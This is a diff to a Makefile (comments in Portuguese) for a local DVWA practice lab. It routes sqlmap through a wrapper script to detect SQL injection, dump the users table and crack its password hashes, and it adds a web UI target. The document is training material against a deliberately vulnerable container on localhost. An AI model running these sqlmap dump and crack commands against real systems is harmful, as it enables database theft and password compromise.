@@ -6,11 +6,12 @@ IMAGE       := vulnerables/web-dvwa
 NAME        := dvwa
 PORT        := 80
 BASE        := http://localhost:$(PORT)
-URL         := $(BASE)/vulnerabilities/sqli/?id=1&Submit=Submit
 COOKIE_FILE := .dvwa-cookie
+# Ataque: escolhe GET (low) ou POST (medium) conforme o nivel atual do cookie.
+ATTACK      := BASE="$(BASE)" COOKIE_FILE="$(COOKIE_FILE)" bash scripts/sqlmap-attack.sh
 LEVEL       ?= low
 
-.PHONY: help up setup scan dump crack level demo down clean
+.PHONY: help up setup scan dump crack level demo ui down clean
 
 help: ## Lista os comandos disponiveis
 	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) \
@@ -26,13 +27,13 @@ setup: ## Cria o banco, faz login (admin/password) e salva o cookie de sessao
 	@bash scripts/setup-dvwa.sh $(PORT) $(COOKIE_FILE)
 
 scan: ## Roda o SQLMap: detecta a injecao e lista os bancos
-	sqlmap -u "$(URL)" --cookie="$$(cat $(COOKIE_FILE))" --batch --dbs --flush-session
+	@$(ATTACK) --dbs --flush-session
 
 dump: ## Extrai a tabela dvwa.users (usuarios e hashes)
-	sqlmap -u "$(URL)" --cookie="$$(cat $(COOKIE_FILE))" --batch -D dvwa -T users --dump
+	@$(ATTACK) -D dvwa -T users --dump
 
 crack: ## Extrai a tabela users e quebra os hashes de senha (dicionario)
-	sqlmap -u "$(URL)" --cookie="$$(cat $(COOKIE_FILE))" --batch --answers="crack=Y" -D dvwa -T users --dump
+	@$(ATTACK) --answers="crack=Y" -D dvwa -T users --dump
 
 level: ## Troca a dificuldade do DVWA (ex: make level LEVEL=impossible)
 	@test -f $(COOKIE_FILE) || { echo "Cookie nao encontrado. Rode 'make setup' primeiro." >&2; exit 1; }
@@ -43,6 +44,9 @@ level: ## Troca a dificuldade do DVWA (ex: make level LEVEL=impossible)
 		echo "[+] Nivel alterado para '$(LEVEL)'. Cookie: $$(cat $(COOKIE_FILE))"
 
 demo: up setup scan dump ## Fluxo completo: sobe, configura, ataca e extrai os dados
+
+ui: ## Sobe a interface web (Flask + Next.js) em http://localhost:3000
+	@bash scripts/run-ui.sh
 
 down: ## Para e remove o container do DVWA
 	-docker rm -f $(NAME)
